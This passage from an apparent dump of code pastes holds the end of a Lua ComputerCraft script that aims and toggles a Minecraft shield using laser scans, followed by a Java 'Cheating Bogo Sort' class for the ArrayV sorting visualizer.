      local laser = peripheral.wrap(name)
      laser.beamFrequency(1420) -- Sets the frequency of the laser to 1420
      table.insert(lasers, laser)
    end
  end

  if #lasers == 0 then
    print(""No laser peripherals found"")
    return false
  end
  return true
end

if not setupLasers() then return end

print(""Control System Online, Toggle Redstone To Toggle Shields, Press C to Configure"")

local _, upgrades = shield.getUpgrades()

function getRange()
    if upgrades:match(""1/4 x Range"") then
        return 1
    elseif upgrades:match(""2/4 x Range"") then
        return 2
    elseif upgrades:match(""3/4 x Range"") then
        return 3
    elseif upgrades:match(""4/4 x Range"") then
        return 4
    elseif upgrades:match(""0/4 x Range"") then
        return 0
    end
end
 
Size = getRange() * 16

while true do
    os.sleep(0.5)
    local event, key = os.pullEvent()

    if event == ""key"" then
        if key == 46 then
            print(""C key pressed, running 'conf' script..."")
            shell.run(""conf"")
        end
    elseif event == ""laserScanning"" then
        for _, laser in ipairs(lasers) do
            local type, lx, ly, lz, block = laser.getScanResult()
            lx, ly, lz = tonumber(lx), tonumber(ly), tonumber(lz) -- Convert to numbers
            local fx, fy, fz = shield.getLocalPosition()

            function shieldOffset()
                local dx = lx - fx
                local dy = ly - fy
                local dz = lz - fz
                local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
                dx = dx / distance
                dy = dy / distance
                dz = dz / distance
                local t1x = lx + dx * OffsetValue
                local t1y = ly + dy * OffsetValue
                local t1z = lz + dz * OffsetValue
                return t1x, t1y, t1z, distance -- Return the final target position and distance
            end

            local t1x, t1y, t1z, distance = shieldOffset()
            tx = (t1x - fx) / Size
            ty = (t1y - fy) / Size
            tz = (t1z - fz) / Size

            if distance < safedist then
                print(""Target is too Close! Shield Disabled!"")
                shield.enable(false) -- Disable shield if too close
            elseif distance > safedist and distance > Size then
                print(""Target is too Far! Shield Disabled!"")
                shield.enable(false) -- Disable shield if too far
            elseif distance > safedist and distance < Size then
                shield.translation(tx, ty, tz)
            end
        end
    elseif event == ""redstone"" then
        local _, _, _, distance = shieldOffset()
        local on = redstone.getAnalogInput(lever)
        if on > 6 and distance > safedist and distance < Size then
            shield.enable(true)
        elseif on > 6 and distance > safedist and distance > Size then
            print(""Target is too Far! Shield Disabled!"")
            shield.enable(false) -- Disable shield if too far
        elseif on > 6 and distance < safedist then
            shield.enable(false)
            print(""Target is too Close! Shield Disabled!"")
        elseif on < 5 then
            shield.enable(false)
        end
    end
end
"
GecAcTCV,Cheating Bogo Sort,DrukHigh,Java,Thursday 27th of July 2023 12:30:02 AM CDT,"package io.github.arrayv.sorts.distribute;

import io.github.arrayv.main.ArrayVisualizer;
import io.github.arrayv.sorts.templates.BogoSorting;

public final class CheatBogoSort extends BogoSorting {
    public CheatBogoSort(ArrayVisualizer arrayVisualizer) {
        super(arrayVisualizer);

        this.setSortListName(""Cheating Bogo"");
        this.setRunAllSortsName(""Cheating Bogo Sort"");
        this.setRunSortName(""Cheating Bogo Sort"");
        this.setCategory(""Impractical Sorts"");
        this.setBucketSort(false);
        this.setRadixSort(false);
        this.setUnreasonablySlow(true);
        this.setUnreasonableLimit(512);
        this.setBogoSort(true);
    }

    private int partition(int[] array, int lo, int hi) {
        int pivot = array[hi];
        int i = lo;

        for(int j = lo; j < hi; j++) {
            Highlights.markArray(1, j);
            if(Reads.compareValues(array[j], pivot) < 0) {
                Writes.swap(array, i, j, 1, true, false);
                i++;
            }
            Delays.sleep(1);
        }
        Writes.swap(array, i, hi, 1, true, false);
        return i;
    }

    private void quickSort(int[] array, int lo, int hi) {
        if(lo < hi) {
            int p = this.partition(array, lo, hi);
            this.quickSort(array, lo, p - 1);
            this.quickSort(array, p + 1, hi);
        }
    }

    @Override
    public void runSort(int[] array, int length, int bucketCount) {
        int[] x = Writes.createExternalArray(length);
        int min = array[0], max = array[0];
        for(int i = 1; i < length; i++) {
            if(array[i] < min) min = array[i];
        }
        for(int i = 0; i < length; i++) {
			Writes.write(x, i, array[i]-min, 0, true, true);
		}
        this.quickSort(x, 0, length - 1);
        int oof = 0;
        while(oof < length)
        if (Reads.compareValues(array[oof], x[oof]) == 0){
                    oof = oof + 1;
                }
            else {
            this.bogoSwap(array, oof, length, false);
                }
        Writes.deleteExternalArray(x);
    }
}
"
